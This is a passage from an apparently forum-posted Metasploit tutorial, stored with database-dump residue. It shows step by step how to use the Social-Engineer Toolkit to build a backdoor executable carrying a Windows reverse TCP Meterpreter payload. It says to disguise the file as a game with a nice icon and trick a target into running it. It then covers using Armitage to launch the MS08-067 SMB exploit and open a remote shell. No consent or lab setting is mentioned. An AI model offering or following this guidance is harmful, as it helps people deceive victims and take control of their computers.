files.\r\n\r\n[h2]Social engineering example[/h2]\r\nNext lets see how to gain access to a targets machine using their interaction. Why? I hear you ask, well sometimes its not possible to connect directly for whatever reason lets say "security settings". The following exploit uses the targets interaction to help us gain access.\r\n\r\nSo first things first  bring up a terminal window and type the command: se-toolkit\r\n\r\nThen enter option 1 for social engineering attacks\r\n\r\n[img]/files/media/images/articles/0/0/up_dcceac0fd07e2de79d9550df12d9eca3.jpg[/img]\r\nNow option 4 to create a payload and listener and enter your IP Address.\r\n\r\n[img]/files/media/images/articles/0/0/up_6de4e27eaf992e55b23837f5b42ff4b5.jpg[/img]\r\nNow you need to pick the type of payload, we will go with option 2 - Windows Reverse TCP Meterpreter.\r\n\r\n[img]/files/media/images/articles/0/0/up_b1a7c925ec2e8c73e5ac7b4defb82b49.jpg[/img]\r\nChoose option 16 - Backdoor Executable\r\nLeave the port set to 443\r\n(This port is used for secure web browser communication. Data transferred across such connections are highly resistant to eavesdropping and interception which is iroic concidering what we are using it for lol)\r\nAnd finally start the listener.\r\n\r\n[img]/files/media/images/articles/0/0/up_85e8ddb7059aded3e547ecbad62944e6.jpg[/img]\r\nOk so lets recap, we have just created an executable file with a payload hidden within. The next part is a little tricky you need to send the file to the target computer and get them to execute it. For example call it games and give it a nice icon lol.\r\n\r\nBefore you send the file navigate to were it was created and right click and properties.\r\n\r\n[img]/files/media/images/articles/0/0/up_c2d9ac296708f9c5a8aaa41bc11ea8b0.jpg[/img]\r\nTick the box to allow the file to be executed as a program\r\n\r\n[img]/files/media/images/articles/0/0/up_23ac654a9aa41b13c3c7c8db56aa8f42.jpg[/img]\r\nSo now we wait..... once the target executes the program you will get the following:\r\n\r\n[img]/files/media/images/articles/0/0/up_f47fdf41cca0ef93ed9b86a9796ccfd3.jpg[/img]\r\nFrom here on in its the usual Meterpreter > prompt  \r\nAs before you can now run commands like screenshot or shell.\r\nThe target is yours!\r\n\r\n[img]/files/media/images/articles/0/0/up_2a55103dcdec4ac7bd7f2e06c833be6b.jpg[/img]\r\n\r\n[h2]Armitage[/h2]\r\nWe''ve seen how to use Metasploit via the command line now lets see how to use a graphical version Armitage that lets us achieve the same goal.\r\n\r\nArmitage is a GUI way of using metasploit/meterpreter rather than cmd line so lets get started.\r\n\r\nFirst navigate to Applications > Kali Linux > System Services > Metasploit > community / pro start ...... this will start the server/database\r\n\r\n[img]/files/media/images/articles/0/0/up_09e7239f76a35fd1aebe692d2ab9c933.jpg[/img]\r\n\r\nThen type armitage in the terminal window and accept the default values:\r\n\r\n[img]/files/media/images/articles/0/0/up_133b44eb36389ea3e833e65b761ca2ec.jpg[/img]\r\nYou will probably get a popup asking to start metasploit, click yes\r\nyou should now see the following:\r\n\r\n[img]/files/media/images/articles/0/0/up_70a7f1bb1540dc6ad71fc692892641d5.jpg[/img]\r\nDont worry about the connection refused it just takes a while to load.\r\nNow armitage will boot up if it asks you for the attack computer IP enter your IP Address.\r\nNavigate to the Hosts tab > Nmap Scan > Quick Scan (OS Detect)\r\n\r\n[img]/files/media/images/articles/0/0/up_f41941e5c6945f47d4dd3a8e43b3bc29.jpg[/img]\r\nFrom here armitage will scan a range or a sigle IP Address of your choice then present it in the black window. Right click the target and click Scan\r\n\r\n[img]/files/media/images/articles/0/0/up_104aa55005305cce0cc7691b8dd0e27a.jpg[/img]\r\nWhen the scan is complete expand the exploit > windows > smb and double click the ms08_67_netapi\r\n\r\n[img]/files/media/images/articles/0/0/up_c415bc13c15126d5b78705de4113bad0.jpg[/img]\r\nThis will bring up an attack confirmation window check the details and click launch\r\n\r\n[img]/files/media/images/articles/0/0/up_df156ff747901c8144cf5d1062749aed.jpg[/img]\r\nConfirmation of a successful exploit will look like this:\r\n\r\n[img]/files/media/images/articles/0/0/up_af26450c85394599f339d4db79b7b139.jpg[/img]\r\nYou can now right click the target and perform multiple commands\r\n\r\n[img]/files/media/images/articles/0/0/up_b4440e30bf4172341ab9ea9c7edb975d.jpg[/img]\r\nhere is an example of the Interact "remote command shell"\r\n\r\n[img]/files/media/images/articles/0/0/up_ad688c74a66aca371d72ce65f8fccb9e.jpg[/img]\r\n[h2]Websploit[/h2]\r\nAs an added extra [url=http://sourceforge.net/projects/websploit/]Websploit[/url] (below) uses exploits from Metasploit and has its own features as well which is used to scan and analysis remote systems in order to find vulnerabilites. If you enjoyed this article please comment and i will do one for Websploit. Thank you.\r\n\r\n[img]/files/media/images/articles/0/0/up_1b990edFROM_UNIXTIME(5407226003)a4ae441d9bebf2b.jpg[/img]\r\n\r\n[h1]Summary[/h1]\r\nMetasploit is a must have for anyone interested in the world of secutiry, you have just seen a few ways in which it can be used however keep in mind that this has only scratched the surface of the potential of this tool.  To find out more please follow the links below.\r\n\r\nHappy Hacking ^__^\r\n', 1226, 0);
